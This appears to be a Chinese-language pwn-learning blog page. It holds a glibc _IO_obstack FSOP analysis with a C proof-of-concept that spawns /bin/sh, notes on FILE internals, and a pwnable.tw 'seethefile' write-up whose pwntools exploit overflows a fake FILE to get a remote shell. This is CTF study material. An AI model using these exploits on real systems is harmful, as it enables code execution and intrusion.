123456789101112131415161718192021222324252627282930static size_t_IO_obstack_xsputn (FILE *fp, const void *data, size_t n)&#123;  // 获取bobstack指针  struct obstack *obstack = ((struct _IO_obstack_file *) fp)-&gt;obstack;	// 检查是否有足够的写入空间, 没有的话,进入里面进行调整  if (fp-&gt;_IO_write_ptr + n &gt; fp-&gt;_IO_write_end)    &#123;      int size;	// 调整缓冲区大小      /* We need some more memory.  First shrink the buffer to the	 space we really currently need.  */      obstack_blank_fast (obstack, fp-&gt;_IO_write_ptr - fp-&gt;_IO_write_end);	// 将数据追加到obstack上      /* Now grow for N bytes, and put the data there.  */      obstack_grow (obstack, data, n);      /* Setup the buffer pointers again.  */      fp-&gt;_IO_write_base = obstack_base (obstack);      fp-&gt;_IO_write_ptr = obstack_next_free (obstack);      size = obstack_room (obstack);      fp-&gt;_IO_write_end = fp-&gt;_IO_write_ptr + size;      /* Now allocate the rest of the current chunk.  */      obstack_blank_fast (obstack, size);    &#125;  else  // 有的话,就直接写入数据了    fp-&gt;_IO_write_ptr = __mempcpy (fp-&gt;_IO_write_ptr, data, n);  return n;&#125;

​	进入到obstack_grow中
123456789# define obstack_grow(OBSTACK, where, length)				      \  __extension__								      \    (&#123; struct obstack *__o = (OBSTACK);					      \       int __len = (length);						      \       if (__o-&gt;next_free + __len &gt; __o-&gt;chunk_limit) 检查空间是否足够			      \	 _obstack_newchunk (__o, __len);			分配新的内存快	      \       memcpy (__o-&gt;next_free, where, __len);				      \       __o-&gt;next_free += __len;						      \       (void) 0; &#125;)

​	进入_obstack_newchunk
12345678910111213141516171819202122232425262728/* Allocate a new current chunk for the obstack *H   on the assumption that LENGTH bytes need to be added   to the current object, or a new object of length LENGTH allocated.   Copies any partial object from the end of the old chunk   to the beginning of the new one.  */void_obstack_newchunk (struct obstack *h, int length)&#123;  struct _obstack_chunk *old_chunk = h-&gt;chunk;  struct _obstack_chunk *new_chunk;  long new_size;  long obj_size = h-&gt;next_free - h-&gt;object_base;  long i;  long already;  char *object_base;  /* Compute size for new chunk.  */  new_size = (obj_size + length) + (obj_size &gt;&gt; 3) + h-&gt;alignment_mask + 100;  if (new_size &lt; h-&gt;chunk_size)    new_size = h-&gt;chunk_size;  /* Allocate and initialize the new chunk.  */  new_chunk = CALL_CHUNKFUN (h, new_size);  if (!new_chunk)    (*obstack_alloc_failed_handler)(); ..........&#125;

​	进入CALL_CHUNKFUN, 所以说这里两条触发路径其实都可以? 回头试试
1234567891011/* Define a macro that either calls functions with the traditional malloc/free   calling interface, or calls functions with the mmalloc/mfree interface   (that adds an extra first argument), based on the state of use_extra_arg.   For free, do not use ?:, since some compilers, like the MIPS compilers,   do not allow (expr) ? void : void.  */# define CALL_CHUNKFUN(h, size) \  (((h)-&gt;use_extra_arg)							      \   ? (*(h)-&gt;chunkfun)((h)-&gt;extra_arg, (size))				      \   : (*(struct _obstack_chunk *(*)(long))(h)-&gt;chunkfun)((size)))



​	综上所述,得到函数调用链
函数调用链
_IO_obstack_xsputn

obstack_grow
_obstack_newchunk
CALL_CHUNKFUN
(*(h)-&gt;chunkfun)((h)-&gt;extra_arg, (size))









伪造结构​	这些偏移都可以看源码找到,或者gdb调试的时候来看
​	一个是_IO_FILE 一个是obstack , 注意下面伪造的结构,把chunkA既当作了IOFILE结构,也当作了obstack,进行了复用,可以压缩空间
1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465struct obstack          /* control current object in current chunk */&#123;  long chunk_size;              /* preferred size to allocate chunks in */  struct _obstack_chunk *chunk; /* address of current struct obstack_chunk */  char *object_base;            /* address of object we are building */  char *next_free;              /* where to add next char to current object */  char *chunk_limit;            /* address of char after current chunk */  union  &#123;    PTR_INT_TYPE tempint;    void *tempptr;  &#125; temp;                       /* Temporary for some macros.  */  int alignment_mask;           /* Mask of alignment for each object. */  /* These prototypes vary based on &#x27;use_extra_arg&#x27;, and we use     casts to the prototypeless function type in all assignments,     but having prototypes here quiets -Wstrict-prototypes.  */  struct _obstack_chunk *(*chunkfun) (void *, long);  void (*freefun) (void *, struct _obstack_chunk *);  void *extra_arg;              /* first arg for chunk alloc/dealloc funcs */  unsigned use_extra_arg : 1;     /* chunk alloc/dealloc funcs take extra arg */  unsigned maybe_empty_object : 1; /* There is a possibility that the current				      chunk contains a zero-length object.  This				      prevents freeing the chunk if we allocate				      a bigger chunk to replace it. */  unsigned alloc_failed : 1;      /* No longer used, as we now call the failed				     handler on error, but retained for binary				     compatibility.  */&#125;;struct _IO_FILE&#123;  int _flags;		/* High-order word is _IO_MAGIC; rest is flags. */  /* The following pointers correspond to the C++ streambuf protocol. */  char *_IO_read_ptr;	/* Current read pointer */  char *_IO_read_end;	/* End of get area. */  char *_IO_read_base;	/* Start of putback+get area. */  char *_IO_write_base;	/* Start of put area. */  char *_IO_write_ptr;	/* Current put pointer. */  char *_IO_write_end;	/* End of put area. */  char *_IO_buf_base;	/* Start of reserve area. */  char *_IO_buf_end;	/* End of reserve area. */  /* The following fields are used to support backing up and undo. */  char *_IO_save_base; /* Pointer to start of non-current get area. */  char *_IO_backup_base;  /* Pointer to first valid character of backup area */  char *_IO_save_end; /* Pointer to end of non-current get area. */  struct _IO_marker *_markers;  struct _IO_FILE *_chain;  int _fileno;  int _flags2;  __off_t _old_offset; /* This used to be _offset but it&#x27;s too small.  */  /* 1+column number of pbase(); 0 is unknown. */  unsigned short _cur_column;  signed char _vtable_offset;  char _shortbuf[1];  _IO_lock_t *_lock;#ifdef _IO_USE_OLD_IO_FILE&#125;;



攻击思路一​	

利用largebin attack伪造_IO_FILE，记完成伪造的chunk为A（或者别的手法）

chunk A内偏移为0x18处设为1（next_free)

chunk A内偏移为0x20处设为0（chunk_limit）
满足  _o-&gt;next_free +   __len &gt; __o-&gt;chunk_limit

chunk A内偏移为0x28处设为1（_IO_write_ptr)

chunk A内偏移为0x30处设为0 (_IO_write_end)


​	满足这个条件: fp-&gt; _IO_write_ptr + n &gt; fp-&gt; _IO_write_end

chunk A内偏移为0x38处设为system函数的地址


chunk A内偏移为0x48处设为&amp;/bin/sh
1234# define CALL_CHUNKFUN(h, size) \  (((h)-&gt;use_extra_arg)							      \   ? (*(h)-&gt;chunkfun)((h)-&gt;extra_arg, (size))				      \   : (*(struct _obstack_chunk *(*)(long))(h)-&gt;chunkfun)((size)))

​	0x38 &#x3D; 56   
​	8 + 8 + 8 + 8 + 8 + 8 + 4  &#x3D;52,  但其实是int alignment_mask; 占据了8字节,可能是因为对其的原因,所以字段还是要实际测试的! 不能想当然的加一下
​	这里: struct _obstack_chunk *(*chunkfun) (void *, long);

chunk A内偏移为0x50处设为1 (use_extra_arg)


​	满足(h)-&gt;use_extra_arg 不为0

chunk A内偏移为0xd8处设为_IO_obstack_jumps+0x20  (vtable的地址)
12345struct _IO_FILE_plus&#123;  _IO_FILE file;  const struct _IO_jump_t *vtable;&#125;;

chunk A内偏移为0xe0处设置chunk A的地址作为obstack结构体 (??
0xe0的位置就是FILE结束后的位置, 也就是vtable之后(_IO_FILE_plus之后)
12345struct _IO_obstack_file&#123;  struct _IO_FILE_plus file;  struct obstack *obstack;&#125;;

触发流程​	通过_IO_flush_all_lockp函数进行触发,这个函数会刷新 _IO_list_all链表中所有项的文件流, 相当于对每个FILE调用fflush, 也会对应调用 _IO_FILE_plus.vtable中的 _IO_overflow,能够看到它位于0x18的位置
123456789pwndbg&gt; tele 0x7ffff7fae60000:0000│  0x7ffff7fae600 (_IO_file_jumps) ◂— 0x001:0008│  0x7ffff7fae608 (_IO_file_jumps+8) ◂— 0x002:0010│  0x7ffff7fae610 (_IO_file_jumps+16) —▸ 0x7ffff7e23fa0 (_IO_file_finish) ◂— endbr6403:0018│  0x7ffff7fae618 (_IO_file_jumps+24) —▸ 0x7ffff7e24d70 (_IO_file_overflow) ◂— endbr6404:0020│  0x7ffff7fae620 (_IO_file_jumps+32) —▸ 0x7ffff7e24a60 (_IO_file_underflow) ◂— endbr6405:0028│  0x7ffff7fae628 (_IO_file_jumps+40) —▸ 0x7ffff7e25d10 (_IO_default_uflow) ◂— endbr6406:0030│  0x7ffff7fae630 (_IO_file_jumps+48) —▸ 0x7ffff7e27230 (_IO_default_pbackfail) ◂— endbr6407:0038│  0x7ffff7fae638 (_IO_file_jumps+56) —▸ 0x7ffff7e235d0 (_IO_file_xsputn) ◂— endbr64

​	而我们进行伪造的vtable是_IO_obstack_jumps, 利用的 _IO_obstack_xsputn位于0x38的位置,所以我们伪造的IOFILE结构体需要将它的vtable替换成&amp; _IO_obstack_xsputn+0x20的位置即可,这样此时vtable+0x18对应额就是 _IO_obstack_xsputn+0x38,也就是 _IO_obstack_xsputn了
函数调用链12345exit    - __run_exit_handlers    	- _IO_cleanup    		- _IO_flush_all_lockp    			- _IO_OVERFLOW( 这里被替换成_IO_obstack_xsputn了)





exp感觉文章给的payload有点问题
120xd0:heap_base + 0x250,      0xc8:libc_base + get_IO_str_jumps() - 0x300 + 0x20



rop123456789pwndbg&gt; disass svcudp_replyDump of assembler code for function svcudp_reply:...........	   0x00007ffff7f00bca &lt;+26&gt;:	mov    rbp,QWORD PTR [rdi+0x48]   0x00007ffff7f00bce &lt;+30&gt;:	mov    rax,QWORD PTR [rbp+0x18]   0x00007ffff7f00bd2 &lt;+34&gt;:	lea    r13,[rbp+0x10]   0x00007ffff7f00bd6 &lt;+38&gt;:	mov    DWORD PTR [rbp+0x10],0x0   0x00007ffff7f00bdd &lt;+45&gt;:	mov    rdi,r13   0x00007ffff7f00be0 &lt;+48&gt;:	call   QWORD PTR [rax+0x28]

 b *svcudp_reply +26
1CALL_CHUNKFUN

leave;ret   &#x3D;  mov rsp,rbp;pop rbp;    pop rip;
1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768#include&lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#define writeend_offset 0x30#define writeptr_offset 0x28#define vtable_offset 0xd8#define next_free_offset 0x18 #define chunk_limit_offset 0x20#define caller_offset 0x38#define caller_arg_offset 0x48#define use_arg_offset 0x50#define fake_obstack_offset 0xe0void backdoor(char *cmd)&#123;  puts(&quot;OHHH!HACKER!!!&quot;);  puts(&quot;HERE IS U SHELL!&quot;);  system(cmd);&#125;char *fake_arg = &quot;/bin/sh\x00&quot;;int main(void)&#123;    puts(&quot;this is a poc&quot;);    size_t libc_base = &amp;puts - 0x80ef0;    size_t _IO_list_all_prt = libc_base + 0x21a660;    size_t _IO_obstack_jumps_prt = libc_base + 0x2163c0;    void *ptr,*ropptr;    long long *list_all_ptr;    ropptr = malloc(0x300);    ptr=malloc(0x200); // 注意这俩顺序    //bypass    *(long long*)((long long)ptr+writeptr_offset)=0x1;    *(long long*)((long long)ptr+writeend_offset)=0x0;    *(long long*)((long long)ptr+next_free_offset)=0x1;    *(long long*)((long long)ptr+chunk_limit_offset)=0x0;    *(long long*)((long long)ptr+use_arg_offset)=0x1;    *(long long*)((long long)ptr+fake_obstack_offset)=(long long*)ptr;    //vtable _IO_obstack_jumps_prt    *(long long*)((long long)ptr+vtable_offset)=(long long*)(_IO_obstack_jumps_prt+0x20);    //set the function to call and its parameters    *(long long*)((long long)ptr+caller_offset)=(long long*)(libc_base+0x168bca);    *(long long*)((long long)ptr+caller_arg_offset)=(long long*)(libc_base+0x168bca);        *(long long*)((long long)ptr+0x48)=(long long*)(ropptr); //mov    rbp,QWORD PTR [rdi+0x48]    *(long long*)((long long)ropptr+0x48)=(long long*)ropptr;    *(long long*)((long long)ropptr+0x18)=(long long*)ropptr;//mov    rax,QWORD PTR [rbp+0x18]    *(long long*)((long long)ropptr+0x28)=(long long*)(libc_base+0x561cc); //call   QWORD PTR [rax+0x28]      leave;ret    *(long long*)((long long)ptr+writeptr_offset)=0x1;            const char binsh[] = &quot;/bin/sh&quot;;    memcpy((char *)ropptr + 0x80, binsh, sizeof(binsh));    *(long long*)((long long)ropptr+0x8)=(long long*)(libc_base+0x11e491);      *(long long*)((long long)ropptr+0x20)=(long long*)(libc_base+0x2a6c5);    *(long long*)((long long)ropptr+0x30)=(long long*)(libc_base+0x2a6c5);    *(long long*)((long long)ropptr+0x38)=(long long*)(ropptr+0x80);     *(long long*)((long long)ropptr+0x40)=(long long*)(&amp;system);            //_IO_list_all _chain 2 fake _IO_FILE_plus    list_all_ptr=(long long *)(_IO_list_all_prt + 0x68 + 0x20);    list_all_ptr[0]=ptr;    exit(0);&#125;



ropptr 那里可以布置rop了,
rdi是怎么来的???什么时候控制的??
123  0x7ffff7e3ed8c &lt;_obstack_newchunk+76&gt;    mov    rdi, qword ptr [rdi + 0x48]► 0x7ffff7e3ed90 &lt;_obstack_newchunk+80&gt;    mov    rsi, rbp  0x7ffff7e3ed93 &lt;_obstack_newchunk+83&gt;    call   rax



0x000000000005f65a : pop rdx ; ret
0x000000000011e491 : pop rdx ; pop r12 ; ret
libc_base+0x2a6c5);&#x2F;&#x2F;pop rdi;ret

</div></div></div><div class="recent-post-item"><div class="recent-post-info no-cover"><a class="article-title" href="/pwn%E5%85%A5%E9%97%A8-50-iofile%E4%B8%BB%E8%A6%81%E5%87%BD%E6%95%B0%E5%88%86%E6%9E%90/" title="pwn入门-50-iofile主要函数分析">pwn入门-50-iofile主要函数分析</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time class="post-meta-date-created" datetime="2024-02-06T06:24:14.000Z" title="发表于 2024-02-06 14:24:14">2024-02-06</time><span class="article-meta-separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2024-02-08T12:36:49.823Z" title="更新于 2024-02-08 20:36:49">2024-02-08</time></span></div><div class="content">iofile的gnu官网介绍  glibc的官方手册里有
https://sourceware.org/glibc/manual/2.37/html_mono/libc.html#I_002fO-on-Streams
FILE结构在程序执行fopen等函数时会创建并分配到堆中
Q&amp;A如何查看_IO_FILE_plus？ 它只是一个结构体，就是_IO_list_all和vtable的封装
每一个iofile都有一个vtable吗？ 是的，每一个都有，紧跟在IO_FILE后面
基础知识​		FILE是Linux系统中 标准IO库用来描述文件的结构，也叫做流（由于历史原因被定义为了FILE），它在程序执行fopen等函数时进行创建，分配到堆中。通常定义一个指向FILE结构的指针来接收这个返回值，然后进行后续操作
​		FILE结构定义在libio&#x2F;libio.h中
12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273struct _IO_FILE &#123;  int _flags;		/* High-order word is _IO_MAGIC; rest is flags. */#define _IO_file_flags _flags  /* The following pointers correspond to the C++ streambuf protocol. */  /* Note:  Tk uses the _IO_read_ptr and _IO_read_end fields directly. */  char* _IO_read_ptr;	/* Current read pointer */  char* _IO_read_end;	/* End of get area. */  char* _IO_read_base;	/* Start of putback+get area. */  char* _IO_write_base;	/* Start of put area. */  char* _IO_write_ptr;	/* Current put pointer. */  char* _IO_write_end;	/* End of put area. */  char* _IO_buf_base;	/* Start of reserve area. */  char* _IO_buf_end;	/* End of reserve area. */  /* The following fields are used to support backing up and undo. */  char *_IO_save_base; /* Pointer to start of non-current get area. */  char *_IO_backup_base;  /* Pointer to first valid character of backup area */  char *_IO_save_end; /* Pointer to end of non-current get area. */  struct _IO_marker *_markers;  struct _IO_FILE *_chain;  int _fileno;#if 0  int _blksize;#else  int _flags2;#endif  _IO_off_t _old_offset; /* This used to be _offset but it&#x27;s too small.  */#define __HAVE_COLUMN /* temporary */  /* 1+column number of pbase(); 0 is unknown. */  unsigned short _cur_column;  signed char _vtable_offset;  char _shortbuf[1];  /*  char* _save_gptr;  char* _save_egptr; */  _IO_lock_t *_lock;#ifdef _IO_USE_OLD_IO_FILE&#125;;struct _IO_FILE_complete&#123;  struct _IO_FILE _file;#endif#if defined _G_IO_IO_FILE_VERSION &amp;&amp; _G_IO_IO_FILE_VERSION == 0x20001  _IO_off64_t _offset;# if defined _LIBC || defined _GLIBCPP_USE_WCHAR_T  /* Wide character stream stuff.  */  struct _IO_codecvt *_codecvt;  struct _IO_wide_data *_wide_data;  struct _IO_FILE *_freeres_list;  void *_freeres_buf;# else  void *__pad1;  void *__pad2;  void *__pad3;  void *__pad4;# endif  size_t __pad5;  int _mode;  /* Make sure we don&#x27;t get into trouble again.  */  char _unused2[15 * sizeof (int) - 4 * sizeof (void *) - sizeof (size_t)];#endif&#125;;#ifndef __cplusplustypedef struct _IO_FILE _IO_FILE;#endifstruct _IO_FILE_plus;

​		通常是用的_IO_FILE_complete？是的，但是还没在代码中找到哪里定义它为 _IO_FILE类型的
123456struct _IO_FILE_plus&#123;  _IO_FILE file;  const struct _IO_jump_t *vtable;&#125;;



​	初始时分配三个文件流
123_IO_2_1_stderr__IO_2_1_stdout__IO_2_1_stdin_



p IO_2_1_stdin
fopen1gdb `find ./glibc-2.23 -type d -printf &#x27;-d %p &#x27;` ./a.out



​	fopen对应函数__fopen_internal 创建FILE结构，初始化结构，从这里可以看出FILE结构是存储在堆上的
1► 69   &#125; *new_f = (struct locked_FILE *) malloc (sizeof (struct locked_FILE));



​	初始化vtable, 设置_IO_file_jumps表
1234567  76 #if defined _LIBC || defined _GLIBCPP_USE_WCHAR_T► 77   _IO_no_init (&amp;new_f-&gt;fp.file, 0, 0, &amp;new_f-&gt;wd, &amp;_IO_wfile_jumps);  78 #else  79   _IO_no_init (&amp;new_f-&gt;fp.file, 1, 0, NULL, NULL);  80 #endif  81   _IO_JUMPS (&amp;new_f-&gt;fp) = &amp;_IO_file_jumps;  82   _IO_file_init (&amp;new_f-&gt;fp);

进一步初始化
1_IO_file_init (&amp;new_f-&gt;fp);

​	在_IO_file_init 函数的初始化操作中，会调用_IO_link_in 把新分配的 FILE 链入_IO_list_all 为起始的 FILE 链表中
123456789101112void_IO_link_in (fp)     struct _IO_FILE_plus *fp;&#123;    if ((fp-&gt;file._flags &amp; _IO_LINKED) == 0)    &#123;      fp-&gt;file._flags |= _IO_LINKED;      fp-&gt;file._chain = (_IO_FILE *) _IO_list_all;      _IO_list_all = fp;      ++_IO_list_all_stamp;    &#125;&#125;

​	之后调用下面函数打开文件，一路往后会到open系统调用
123456if (_IO_file_fopen ((_IO_FILE *) new_f, filename, mode, is32) != NULL)    return __fopen_maybe_mmap (&amp;new_f-&gt;fp.file);_IO_file_open0x7ffff7a86ad9 &lt;_IO_file_open+137&gt;    call   open64                &lt;open64&gt;



​	找变量: info var _IO_list_all
​	如何查看完整的_IO_list_all的链子呢？？？可以手动找chain连接起来
12345678910111213141516171819202122232425262728293031323334353637383940414243444546pwndbg&gt; info var _IO_list_allAll variables matching regular expression &quot;_IO_list_all&quot;:File genops.c:42:     static int _IO_list_all_stamp;File stdfiles.c:73:     struct _IO_FILE_plus *_IO_list_all;72:     struct _IO_FILE_plus *__GI__IO_list_allpwndbg&gt; p _IO_list_all$8 = (struct _IO_FILE_plus *) 0x7ffff7dd2540 &lt;_IO_2_1_stderr_&gt;        pwndbg&gt; p *(struct _IO_FILE *)_IO_list_all$9 = &#123;  _flags = -72540026,  _IO_read_ptr = 0x0,  _IO_read_end = 0x0,  _IO_read_base = 0x0,  _IO_write_base = 0x0,  _IO_write_ptr = 0x0,  _IO_write_end = 0x0,  _IO_buf_base = 0x0,  _IO_buf_end = 0x0,  _IO_save_base = 0x0,  _IO_backup_base = 0x0,  _IO_save_end = 0x0,  _markers = 0x0,  _chain = 0x7ffff7dd2620 &lt;_IO_2_1_stdout_&gt;,  _fileno = 2,  _flags2 = 0,  _old_offset = -1,  _cur_column = 0,  _vtable_offset = 0 &#x27;\000&#x27;,  _shortbuf = &quot;&quot;,  _lock = 0x7ffff7dd3770 &lt;_IO_stdfile_2_lock&gt;,  _offset = -1,  _codecvt = 0x0,  _wide_data = 0x7ffff7dd1660 &lt;_IO_wide_data_2&gt;,  _freeres_list = 0x0,  _freeres_buf = 0x0,  __pad5 = 0,  _mode = 0,  _unused2 = &#x27;\000&#x27; &lt;repeats 19 times&gt;&#125;







fread​	标准IO库函数、从文件流中读取数据, 函数原型如下:
1size_t fread ( void *buffer, size_t size, size_t count, FILE *stream) ;


buffer 存放读取数据的缓冲区。

size：指定每个记录的长度。

count： 指定记录的个数。

stream：目标文件流。

返回值：返回读取到数据缓冲区中的记录个数

函数代码位于libio&#x2F;iofread.c中, 函数名是_IO_fread,调到 _IO_sgetn


1► 38   bytes_read = _IO_sgetn (fp, (char *) buf, bytes_requested);

​	然后到_IO_XSGETN,    _IO_XSGETN 是 _IO_FILE_plus.vtable 中的函数指针, 指向 _IO_file_xsputn
123456789  463 _IO_size_t  464 _IO_sgetn (_IO_FILE *fp, void *data, _IO_size_t n)  465 &#123;  466   /* FIXME handle putback buffer here! */► 467   return _IO_XSGETN (fp, data, n);  468 &#125;0x7ffff7a8871b &lt;_IO_sgetn+11&gt;     jmp    rax           &lt;__GI__IO_file_xsgetn&gt;

​	_IO_file_xsputn
108:0040│  0x7ffff7dd0720 (_IO_file_jumps+64) —▸ 0x7ffff7a85ed0 (__GI__IO_file_xsgetn) ◂— push r14

​	检查想要的字节数want是否小于缓冲区可用字节数
12345678910111408              /* If we now want less than a buffer, underflow and repeat1409                 the copy.  Otherwise, _IO_SYSREAD directly to1410                 the user buffer. */1411              if (fp-&gt;_IO_buf_base1412                  &amp;&amp; want &lt; (size_t) (fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base))1413                &#123;1414                  if (__underflow (fp) == EOF)1415                    break;14161417                  continue;1418                &#125;







fwrite​	向文件流中写入数据, 函数原型如下
1size_t fwrite(const void* buffer, size_t size, size_t count, FILE* stream);


buffer: 是一个指针，对 fwrite 来说，是要写入数据的地址;
size: 要写入内容的单字节数;
count: 要进行写入 size 字节的数据项的个数;
stream: 目标文件指针;
返回值：实际写入的数据项个数 count。

​	代码位于libio&#x2F;iofwrite.c,函数名是_IO_fwrite, 这里面主要是调用 _IO_XSPUTN 实现写入功能
12345   38   if (_IO_vtable_offset (fp) != 0 || _IO_fwide (fp, -1) == -1) ► 39     written = _IO_sputn (fp, (const char *) buf, request);► 0x7ffff7a7b7c8 &lt;fwrite+216&gt;    call   qword ptr [rax + 0x38]        &lt;_IO_file_xsputn&gt;



​	然后_IO_new_file_xsputn中又会调用 _IO_OVERFLOW ,对应 _IO_new_file_overflow, 最终会走到write系统调用那
12► 851     return _IO_do_write (f, f-&gt;_IO_write_base,  852                          f-&gt;_IO_write_ptr - f-&gt;_IO_write_base);





fclose​	标准IO库中用于关闭已经打开文件的函数,作用与fopen相反, 
​	函数原型: int fclose(FILE *stream)
​	功能：关闭一个文件流，使用 fclose 就可以把缓冲区内最后剩余的数据输出到磁盘文件中，并释放文件指针和有关的缓冲区
换句话说,调用fclose的时候会调用很多处理函数, 可以被我们利用
​	首先调用_IO_un_link函数将指定的iofile进行脱链(从 _chain中)
1► 54     _IO_un_link ((struct _IO_FILE_plus *) fp);



​	然后调用_IO_file_close_it函数, 进而调用系统调用close关闭文件
1► 58     status = _IO_file_close_it (fp);



​	 最后调用vtable中的 ► 62   _IO_FINISH (fp);，对应的是_IO_file_finish 函数，它会调用free释放之前分配的FILE结构
（所以vtable劫持的原理就出来了） ? ?? 哪出来了?
问题_IO_OVERFLOW 这个东西是不是宏呢？ 还是啥，怎么对应vtable里面的函数的呢  
</div></div></div><div class="recent-post-item"><div class="recent-post-info no-cover"><a class="article-title" href="/pwn%E5%85%A5%E9%97%A8-49-pwnable%E4%B9%8Bseethefile/" title="pwn入门-49-pwnable之seethefile">pwn入门-49-pwnable之seethefile</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time class="post-meta-date-created" datetime="2024-01-28T14:31:00.000Z" title="发表于 2024-01-28 22:31:00">2024-01-28</time><span class="article-meta-separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2024-01-28T14:33:12.059Z" title="更新于 2024-01-28 22:33:12">2024-01-28</time></span></div><div class="content">主要参考: https://xuanxuanblingbling.github.io/ctf/pwn/2020/04/03/file/
2.23版本没有做检查, 简单入门下iofile
利用分析Ubuntu GLIBC 2.23-0ubuntu5
1234567891011121314151617181920212223242526272829303132333435363738394041int __cdecl main(int argc, const char **argv, const char **envp)&#123;  char nptr; // [esp+Ch] [ebp-2Ch]  unsigned int v4; // [esp+2Ch] [ebp-Ch]  v4 = __readgsdword(0x14u);  init();  welcome();  while ( 1 )  &#123;    menu();    __isoc99_scanf(&quot;%s&quot;, &amp;nptr);    switch ( atoi(&amp;nptr) )    &#123;      case 1:        openfile();        break;      case 2:        readfile();        break;      case 3:        writefile();        break;      case 4:        closefile();        break;      case 5:        printf(&quot;Leave your name :&quot;);        __isoc99_scanf(&quot;%s&quot;, &amp;name);        printf(&quot;Thank you %s ,see you next time\n&quot;, &amp;name);        if ( fp )          fclose(fp);        exit(0);        return;      default:        puts(&quot;Invaild choice&quot;);        exit(0);        return;    &#125;  &#125;&#125;



​	一眼顶针  name存在溢出，可以溢出到fp, 并且保护没有开PIE,可以知道地址,
12345678.bss:0804B260 name            db 20h dup(?)           ; DATA XREF: main+9F↑o.bss:0804B260                                         ; main+B4↑o.bss:0804B280                 public fp.bss:0804B280 ; FILE *fp.bss:0804B280 fp              dd ?                    ; DATA XREF: openfile+6↑r.bss:0804B280                                         ; openfile+AD↑w ....bss:0804B280 _bss            ends.bss:0804B280



​	fp这里是一个FILE结构体，如何利用呢？
​	伪造一个fake FILE，放到bss后面就可以了，地址也知道，然后覆盖地址为伪造的FILE地址
伪造iofile及其虚表​	如何伪造？ 各个变量的值应该是多少？、
​	file结构：https://ctf-wiki.org/pwn/linux/user-mode/io-file/introduction/
1234567fakeFILE = 0x0804B284payload  = &#x27;a&#x27;*0x20payload += p32(fakeFILE)payload += p32(0xffffdfff)payload += &quot;;$0&quot;+&#x27;\x00&#x27;*0x8d payload += p32(fakeFILE+0x98)  // 这是虚表地址payload += p32(system_addr)*3  // 虚表内容



​	iofile的结构如下图: 

伪造flags 从而触发_finish1_flags&amp;0x2000为0就会直接调用_IO_FINSH(fp),_IO_FINSH(fp)相当于调用fp-&gt;vtable-&gt;_finish(fp)



​	所以最后是调用了_IO_file_finish触发的（fclose？）， 为什么不用&#x2F;bin&#x2F;sh呢？
伪造虚表​	IOFILE之后就是 _IO_file_jumps，所以，可以劫持这个vtable指针，
12pwndbg&gt; p sizeof(_IO_FILE)$4 = 148

​	大小是148， 也就是0x94, 0x94这里存的是虚表的地址,所以 虚表的位置位于fakeFILE+0x94 + 4
​	_finish位于第三个位置,所以把第三个位置伪造成system就行了
;$0是什么？;是隔断命令的意思, $0经过实验是bash
expexp一直没成功，估计是栈平衡的事？ 不像, libc的事
本地和远程还不太一样, 远程的话,接收到的libc地址需要+0x1000( 在调试的时候能发现这一个特殊的地方,虽然不知道是干啥的,
远程打通的exp
12345678910111213141516171819202122232425262728293031323334353637from pwn import *context(arch=&#x27;i386&#x27;,os=&#x27;linux&#x27;,log_level=&#x27;debug&#x27;)context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]myelf  = ELF(&quot;./seethefile&quot;)#libc   = ELF(&quot;./libc.so.6&quot;)libc   = ELF(&quot;./libc_32.so.6&quot;)io     = remote(&quot;chall.pwnable.tw&quot;,10200)#io = process(&quot;./seethefile&quot;)sla          = lambda delim,data       :io.sendlineafter(delim, data)openfile     = lambda name :  (sla(&quot;choice :&quot;,&quot;1&quot;),sla(&quot;see :&quot;,name))readfile     = lambda      :  (sla(&quot;choice :&quot;,&quot;2&quot;))showfile     = lambda      :  (sla(&quot;choice :&quot;,&quot;3&quot;))leave        = lambda name :  (sla(&quot;choice :&quot;,&quot;5&quot;),sla(&quot;ame :&quot;,name))# gdb.attach(io)# leak libcopenfile(&quot;/proc/self/maps&quot;)readfile()showfile()io.recvuntil(&quot;[heap]\n&quot;)libc_addr = int(io.recv(8),16) + 0x1000print(&quot;libc:&quot;,hex(libc_addr))system_addr = libc_addr +libc.symbols[&#x27;system&#x27;]print(hex(system_addr))#pause()# make fake filefakeFILE = 0x0804B284payload  = b&#x27;a&#x27;*0x20payload += p32(fakeFILE)payload += p32(0xffffdfff)payload += b&quot;;$0&quot;+b&#x27;\x00&#x27;*0x8dpayload += p32(fakeFILE+0x98)payload += p32(system_addr)*3# getshellleave(payload)io.interactive()

</div></div></div><div class="recent-post-item"><div class="recent-post-info no-cover"><a class="article-title" href="/pwn%E5%85%A5%E9%97%A8-48-setcontext%E5%BA%94%E7%94%A8/" title="pwn入门-48-setcontext应用">pwn入门-48-setcontext应用</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time class="post-meta-date-created" datetime="2024-01-27T15:28:41.000Z" title="发表于 2024-01-27 23:28:41">2024-01-27</time><span class="article-meta-separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2024-01-30T10:28:21.554Z" title="更新于 2024-01-30 18:28:21">2024-01-30</time></span><span class="article-meta"><span class="article-meta-separator">|</span><i class="fas fa-inbox"></i><a class="article-meta__categories" href="/categories/PWN/">PWN</a></span><span class="article-meta tags"><span class="article-meta-separator">|</span><i class="fas fa-tag"></i><a class="article-meta__tags" href="/tags/PWN%E5%85%A5%E9%97%A8/">PWN入门</a></span></div><div class="content">参考： www.anquanke.com/post/id/236832
DASCTF 2021中的ParentSimulator
